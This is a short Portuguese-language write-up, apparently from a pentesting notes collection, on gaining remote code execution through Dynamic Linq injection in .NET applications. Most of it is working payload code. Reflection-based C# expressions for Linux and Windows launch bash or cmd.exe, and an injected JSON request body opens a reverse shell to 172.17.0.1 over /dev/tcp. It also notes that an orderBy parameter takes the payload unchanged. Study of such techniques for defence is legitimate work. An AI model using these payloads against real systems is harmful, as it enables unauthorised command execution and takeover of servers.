O Dynamic Linq (System.Linq.Dynamic.Core) é uma biblioteca do .NET que facilita a consulta de dados em arrays, listas, entre outros. Com ela, podemos executar queries semelhantes ao SQL, permitindo a busca de dados nos arrays com facilidade.

### Payload final para Linux

```csharp
"".GetType().Assembly.DefinedTypes.Where(it.Name == "AppDomain").First().DeclaredMethods.Where(it.Name == "CreateInstanceAndUnwrap").First().Invoke("".GetType().Assembly.DefinedTypes.Where(it.Name == "AppDomain").First().DeclaredProperties.Where(it.name == "CurrentDomain").First().GetValue(null), "System, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = b77a5c561934e089; System.Diagnostics.Process".Split(";".ToCharArray())).GetType().Assembly.DefinedTypes.Where(it.Name == "Process").First().DeclaredMethods.Where(it.name == "Start").Take(3).Last().Invoke(null, "bash;-c <command-here>".Split(";".ToCharArray()))
```

### Payload final para Windows

```csharp
"".GetType().Assembly.DefinedTypes.Where(it.Name == "AppDomain").First().DeclaredMethods.Where(it.Name == "CreateInstanceAndUnwrap").First().Invoke("".GetType().Assembly.DefinedTypes.Where(it.Name == "AppDomain").First().DeclaredProperties.Where(it.name == "CurrentDomain").First().GetValue(null), "System, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = b77a5c561934e089; System.Diagnostics.Process".Split(";".ToCharArray())).GetType().Assembly.DefinedTypes.Where(it.Name == "Process").First().DeclaredMethods.Where(it.name == "Start").Take(3).Last().Invoke(null, "cmd.exe;/c <command-here>".Split(";".ToCharArray()))
```

### Obtendo RCE através do Dynamic Linq injection
Voltando na aplicação onde exploramos o Dynamic Linq injection, podemos obter RCE enviando a payload que criamos:

```json
{
"name": "pple\") || \"\".GetType().Assembly.DefinedTypes.Where(it.Name == \"AppDomain\").First().DeclaredMethods.Where(it.Name == \"CreateInstanceAndUnwrap\").First().Invoke(\"\".GetType().Assembly.DefinedTypes.Where(it.Name == \"AppDomain\").First().DeclaredProperties.Where(it.name == \"CurrentDomain\").First().GetValue(null), \"System, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = b77a5c561934e089; System.Diagnostics.Process\".Split(\";\".ToCharArray())).GetType().Assembly.DefinedTypes.Where(it.Name == \"Process\").First().DeclaredMethods.Where(it.name == \"Start\").Take(3).Last().Invoke(null, \"bash;-c \\\"bash -i >& /dev/tcp/172.17.0.1/80 0>&1\\\"\".Split(\";\".ToCharArray())).ToString() == \"\" || Name.Contains(\""
}
```

Veja que no final da payload foi necessário colocar ".ToString()" e fazer uma comparação, pois estamos utilizando o operador "||" para fazer a injeção na query Linq, e isso requer um resultado booleano.
### order by
No endpoint onde temos controle no orderBy, basta inserir a payload sem nenhuma modificação



***
## Referência
https://blog.crowsec.com.br/obtendo-rce-atraves-de-um-dynamic-linq-injection/